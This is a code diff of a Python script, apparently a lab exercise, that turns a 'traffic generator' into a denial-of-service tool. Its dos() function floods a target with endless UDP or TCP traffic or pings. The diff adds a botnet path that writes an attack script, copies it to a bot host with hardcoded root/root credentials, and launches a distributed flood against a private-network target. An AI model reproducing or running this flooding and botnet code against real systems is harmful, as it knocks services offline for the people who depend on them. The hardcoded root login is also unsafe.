@@ -1,9 +1,10 @@
 # Traffic Generator
 from Inputs import get_inputs
+import Botnet
 import getpass, socket, time, subprocess
 
 # generate regular traffic and requests
-def generate_traffic(host, transmission, port, buffer_size):
+def generate_traffic(host, transmission, port, buffer_size, message):
     if transmission == "TCP":
         conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         conn.connect((host, port))
@@ -19,12 +20,12 @@ def generate_traffic(host, transmission, port, buffer_size):
     elif transmission == "UDP":
         conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         conn.connect((host, port))
-        data = conn.sendto(b"Hello", (host, port))
+        data = conn.sendto(message.encode(), (host, port))
 
     return(data)
 
 # attempt denial of service on host
-def dos(host, transmission, port, buffer_size):
+def dos(host, transmission, port, buffer_size, message):
     print("Denial of service attempt.")
     # do ping requests for ICMP
     if transmission == "ICMP":
@@ -51,15 +52,15 @@ def dos(host, transmission, port, buffer_size):
             conn.close()
 
     elif transmission == "UDP":
-        message = b"DENIAL OF SERVICE!!" * 100
         while True:
             conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             conn.connect((host, port))
-            conn.sendto(message, (host, port))
+            conn.sendto(message.encode(), (host, port))
     return(data)
 
-# attempt distributed denial of service on host with multiple bots (botnet)
-def ddos(host, transmission, port, buffer_size, botnet):
+# attempt distributed denial of service on host with multiple bots (botnet) and localhost
+def ddos(bot, username, password, script, host, transmission, port, buffer_size, att_msg):
+    Botnet.generate_dos(bot, username, password, script)
     return()
 
 username = getpass.getuser()
@@ -80,12 +81,26 @@ elif "B" in buffer_size:
 
 #host = "192.168.3.130"
 host = "192.168.126.128"
+bot = "192.168.126.129"
+username = "root"
+password = "root"
+message = "Hello"
+att_msg = "Denial Of Service"
 
 print("Target: {}, Protocol: {}, Port: {}, Buffer Size: {} bytes. \n".format(host, transmission, str(port), str(buffer_size)))
 
-#output = generate_traffic(host, transmission, port, buffer_size)
+#output = generate_traffic(host, transmission, port, buffer_size, message)
 delay = 0.1
 
-output = dos(host, transmission, port, buffer_size)
-print('Received: {}'.format(output))
+#output = dos(host, transmission, port, buffer_size, att_msg)
+DDOS = True
+if DDOS:
+    print("PREPARING BOTNET...")
+    # generate bot_dos.py
+    script = Botnet.create_bot_dos_script(host, att_msg, port, transmission, buffer_size)
+    # transfer the script to each bot
+    Botnet.transfer_script(bot, username, password, script)
+    # run the attacl
+    ddos(bot, username, password, script, host, transmission, port, buffer_size, att_msg)
+#print('Received: {}'.format(output))
 
